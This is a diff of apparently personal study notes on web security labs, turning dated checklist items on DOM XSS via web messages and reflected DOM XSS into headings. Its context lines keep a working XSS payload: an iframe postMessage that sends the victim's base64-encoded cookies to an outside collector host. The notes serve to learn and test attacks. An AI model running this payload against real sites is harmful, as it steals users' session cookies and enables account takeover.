@@ -323,7 +323,7 @@ Hoặc cướp cookie thì như sau
 ![alt text](image-28.png)
 
 
-- [ ] **25/4** — DOM XSS using web messages
+### DOM XSS using web messages
 
 #### Source (nguồn dữ liệu không tin cậy)
 
@@ -344,7 +344,7 @@ window.addEventListener('message', function(e) {
 <iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=fetch(`https://OASTIFY.COM?collector=`+btoa(document.cookie))>','*')">
 ```
 
-- [ ] **26/4** — Reflected DOM XSS
+### Reflected DOM XSS
 ![alt text](image-31.png)
 checking with dom invader we can see 1 sinks is eval ; let go to source code 
 ![alt text](image-30.png)
